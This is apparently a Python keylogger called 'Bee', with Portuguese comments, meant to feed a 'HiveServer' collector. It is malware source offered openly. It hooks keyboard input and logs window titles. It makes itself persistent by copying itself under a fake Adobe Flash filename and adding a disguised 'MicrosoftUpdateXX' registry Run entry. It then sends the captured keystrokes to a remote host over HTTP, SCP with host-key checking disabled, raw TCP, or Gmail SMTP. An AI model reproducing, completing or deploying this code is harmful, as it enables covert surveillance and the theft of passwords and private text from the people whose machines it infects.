#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Bee.py - Keylogger para BLACKBOX HiveServer
# Author: Guilherme Alexander
# https://github.com/Guilherme-alexander

import pythoncom
import pyHook
from os import path
from time import sleep
from threading import Thread
import urllib.request
import urllib.parse
import json
import smtplib
import datetime
import win32com.client
import win32event
import win32api
import winerror
from _winreg import *
import shutil
import sys
import socket
import os
import subprocess
import tempfile

# ============================================================
# CONFIGURAÇÕES INJETADAS PELO HIVESERVER
# ============================================================
# ACTIVE_PROTOCOLS = ['http', 'ssh', 'tcp', 'email']
# SERVER_URL = "http://192.168.1.100:5000/log"
# SSH_HOST = "192.168.1.100"
# SSH_USER = "user"
# SSH_PASS = "password"
# SSH_KEY_FILE = "~/.ssh/id_rsa"
# SSH_PORT = 22
# SSH_PATH = "/var/log/hive/"
# TCP_HOST = "192.168.1.100"
# TCP_PORT = 9999
# EEMAIL = "seu_email@gmail.com"
# EPASS = "sua_senha"
# ============================================================

# Verifica se já está rodando (Mutex)
try:
    ironm = win32event.CreateMutex(None, 1, 'NOSIGN')
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        print("[!] Keylogger já está em execução!")
        sys.exit()
except:
    pass

# Variáveis globais
data_buffer = ''
lastWindow = ''
hostname = socket.gethostname()
start_time = datetime.datetime.now()
is_windows = sys.platform.startswith('win')

# Diretório para persistência (Windows)
dir_path = r"C:\Users\Public\Libraries\adobeflashplayer.exe"

def startup():
    """Copia o executável para o diretório Public e adiciona ao registro"""
    if not is_windows:
        return
        
    try:
        if not path.exists(path.dirname(dir_path)):
            os.makedirs(path.dirname(dir_path))
        
        shutil.copy(sys.argv[0], dir_path)
        aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
        aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
        SetValueEx(aKey, "MicrosoftUpdateXX", 0, REG_SZ, dir_path)
        CloseKey(aKey)
        CloseKey(aReg)
        print(f"[+] Persistência configurada: {dir_path}")
    except Exception as e:
        print(f"[-] Erro na persistência: {e}")

if is_windows and not path.isfile(dir_path):
    startup()

def send_via_http(log_data):
    """Envia logs via HTTP POST"""
    try:
        if 'SERVER_URL' not in globals() or not SERVER_URL:
            return False
            
        payload = {
            "hostname": hostname,
            "data": log_data,
            "timestamp": datetime.datetime.now().isoformat()
        }
        
        json_data = json.dumps(payload).encode('utf-8')
        
        req = urllib.request.Request(
            SERVER_URL,
            data=json_data,
            headers={'Content-Type': 'application/json'}
        )
        
        with urllib.request.urlopen(req, timeout=10) as response:
            response_data = response.read().decode('utf-8')
            print(f"[+] HTTP: Log enviado ({len(log_data)} caracteres)")
            return True
            
    except Exception as error:
        print(f"[-] HTTP: Erro - {error}")
        return False

def send_via_ssh(log_data):
    """Envia logs via SSH/SCP usando subprocess"""
    try:
        if 'SSH_HOST' not in globals() or not SSH_HOST:
            return False
        if 'SSH_USER' not in globals() or not SSH_USER:
            return False
            
        # Cria arquivo temporário
        temp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.log', delete=False)
        temp_file.write(log_data)
        temp_file.close()
        
        # Prepara comando
        ssh_port = SSH_PORT if 'SSH_PORT' in globals() else 22
        ssh_path = SSH_PATH if 'SSH_PATH' in globals() else '/var/log/hive/'
        
        # Comando para criar diretório remoto
        if 'SSH_KEY_FILE' in globals() and SSH_KEY_FILE and path.exists(SSH_KEY_FILE):
            ssh_cmd = ['ssh', '-i', SSH_KEY_FILE, '-p', str(ssh_port), 
                      '-o', 'StrictHostKeyChecking=no']
            scp_cmd = ['scp', '-i', SSH_KEY_FILE, '-P', str(ssh_port)]
        else:
            ssh_cmd = ['ssh', '-p', str(ssh_port), '-o', 'StrictHostKeyChecking=no']
            scp_cmd = ['scp', '-P', str(ssh_port)]
        
        # Adiciona credenciais se for senha
        if 'SSH_PASS' in globals() and SSH_PASS:
            # Usa sshpass se disponível
            if shutil.which('sshpass'):
                ssh_cmd = ['sshpass', '-p', SSH_PASS] + ssh_cmd
                scp_cmd = ['sshpass', '-p', SSH_PASS] + scp_cmd
        
        # Cria diretório remoto
        mkdir_cmd = ssh_cmd + [f'{SSH_USER}@{SSH_HOST}', f'mkdir -p {ssh_path}']
        subprocess.run(mkdir_cmd, capture_output=True, timeout=10)
        
        # Nome do arquivo remoto
        remote_filename = f"{hostname}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        remote_path = f"{SSH_USER}@{SSH_HOST}:{ssh_path}{remote_filename}"
        
        # Envia arquivo via SCP
        scp_cmd = scp_cmd + [temp_file.name, remote_path]
        result = subprocess.run(scp_cmd, capture_output=True, timeout=30)
        
        # Remove arquivo temporário
        try:
            os.unlink(temp_file.name)
        except:
            pass
        
        if result.returncode == 0:
            print(f"[+] SSH: Log enviado para {SSH_HOST}:{ssh_path}{remote_filename}")
            return True
        else:
            print(f"[-] SSH: Erro - {result.stderr}")
            return False
            
    except Exception as error:
        print(f"[-] SSH: Erro - {error}")
        return False

def send_via_tcp(log_data):
    """Envia logs via TCP Socket"""
    try:
        if 'TCP_HOST' not in globals() or not TCP_HOST:
            return False
            
        tcp_port = TCP_PORT if 'TCP_PORT' in globals() else 9999
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((TCP_HOST, tcp_port))
        
        message = f"[{hostname}] {datetime.datetime.now().isoformat()}\n{log_data}\n{'-'*60}\n"
        sock.send(message.encode('utf-8'))
        sock.close()
        
        print(f"[+] TCP: Log enviado para {TCP_HOST}:{tcp_port}")
        return True
        
    except Exception as error:
        print(f"[-] TCP: Erro - {error}")
        return False

def send_via_email(log_data):
    """Envia logs via E-mail (Gmail)"""
    try:
        if 'EEMAIL' not in globals() or not EEMAIL:
            return False
        if 'EPASS' not in globals() or not EPASS:
            return False
            
        timeInSecs = datetime.datetime.now()
        SERVER = "smtp.gmail.com"
        PORT = 587
        USER = EEMAIL
        PASS = EPASS
        FROM = USER
        TO = [USER]
        SUBJECT = f"🐝 Bee Log: {hostname} - {timeInSecs.strftime('%Y-%m-%d %H:%M:%S')}"
        
        message = f"""From: {FROM}
To: {', '.join(TO)}
Subject: {SUBJECT}

Host: {hostname}
Data: {timeInSecs.isoformat()}

{log_data}
"""
        
        server = smtplib.SMTP(SERVER, PORT)
        server.starttls()
        server.login(USER, PASS)
        server.sendmail(FROM, TO, message.encode('utf-8'))
        server.quit()
        
        print(f"[+] E-mail: Log enviado para {EEMAIL}")
        return True
        
    except Exception as error:
        print(f"[-] E-mail: Erro - {error}")
        return False

def send_logs(log_data):
    """Envia logs usando todos os protocolos ativos"""
    if not log_data:
        return
        
    success = False
    
    # Lista de protocolos ativos
    protocols = ACTIVE_PROTOCOLS if 'ACTIVE_PROTOCOLS' in globals() else ['http']
    
    for protocol in protocols:
        if protocol == 'http':
            if send_via_http(log_data):
                success = True
        elif protocol == 'ssh':
            if send_via_ssh(log_data):
                success = True
        elif protocol == 'tcp':
            if send_via_tcp(log_data):
                success = True
        elif protocol == 'email':
            if send_via_email(log_data):
                success = True
    
    # Se nenhum protocolo funcionou, tenta salvar localmente
    if not success:
        try:
            log_dir = os.path.join(os.path.expanduser('~'), 'bee_logs')
            if not os.path.exists(log_dir):
                os.makedirs(log_dir)
            
            filename = os.path.join(log_dir, f"{hostname}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(log_data)
            print(f"[+] Log salvo localmente em: {filename}")
        except Exception as e:
            print(f"[-] Erro ao salvar log local: {e}")

def send_to_server():
    """Thread principal para envio de logs"""
    global data_buffer
    while True:
        if len(data_buffer) > 30:
            log_data = data_buffer
            data_buffer = ''  # Limpa o buffer antes de enviar
            
            # Tenta enviar os logs
            send_logs(log_data)
        
        sleep(120)  # Espera 2 minutos

def pushing(event):
    """Callback para captura de teclas"""
    global data_buffer, lastWindow
    
    try:
        window = event.WindowName
        
        # Mapeamento de teclas especiais
        keys = {
            13: ' [ENTER] ',
            8: ' [BACKSPACE] ',
            162: ' [CTRL] ',
            163: ' [CTRL] ',
            164: ' [ALT] ',
            165: ' [ALT] ',
            160: ' [SHIFT] ',
            161: ' [SHIFT] ',
            46: ' [DELETE] ',
            32: ' [SPACE] ',
            27: ' [ESC] ',
            9: ' [TAB] ',
            20: ' [CAPSLOCK] ',
            38: ' [UP] ',
            40: ' [DOWN] ',
            37: ' [LEFT] ',
            39: ' [RIGHT] ',
            91: ' [SUPER] '
        }
        
        # Obtém o caractere ou nome da tecla
        keyboardKeyName = keys.get(event.Ascii, chr(event.Ascii) if 32 <= event.Ascii <= 126 else f' [0x{event.Ascii:X}] ')
        
        # Adiciona ao buffer com informação da janela
        if window != lastWindow:
            lastWindow = window
            data_buffer += f' {{ {lastWindow} }} '
            data_buffer += keyboardKeyName
        else:
            data_buffer += keyboardKeyName
            
    except Exception as e:
        print(f"[-] Erro na captura: {e}")

def main():
    """Função principal do keylogger"""
    print(f"""
{'='*50}
🐝 BEE KEYLOGGER - BLACKBOX HIVE
{'='*50}
Hostname: {hostname}
Protocolos: {ACTIVE_PROTOCOLS if 'ACTIVE_PROTOCOLS' in globals() else 'Não configurados'}
{'='*50}
""")
    
    # Exibe configurações ativas
    if 'SERVER_URL' in globals():
        print(f"[+] HTTP: {SERVER_URL}")
    if 'SSH_HOST' in globals():
        print(f"[+] SSH: {SSH_USER}@{SSH_HOST}:{SSH_PORT if 'SSH_PORT' in globals() else 22}")
    if 'TCP_HOST' in globals():
        print(f"[+] TCP: {TCP_HOST}:{TCP_PORT if 'TCP_PORT' in globals() else 9999}")
    if 'EEMAIL' in globals():
        print(f"[+] E-mail: {EEMAIL}")
    
    print("\n[+] Keylogger iniciado! Aguardando teclas...\n")
    
    # Inicia thread para enviar logs
    send_thread = Thread(target=send_to_server)
    send_thread.daemon = True
    send_thread.start()
    
    # Configura e inicia o hook do teclado
    try:
        hookManager = pyHook.HookManager()
        hookManager.KeyDown = pushing
        hookManager.HookKeyboard()
        
        pythoncom.PumpMessages()
        
    except Exception as e:
        print(f"[-] Erro no hook: {e}")
        sleep(5)
        main()

if __name__ == '__main__':
    main()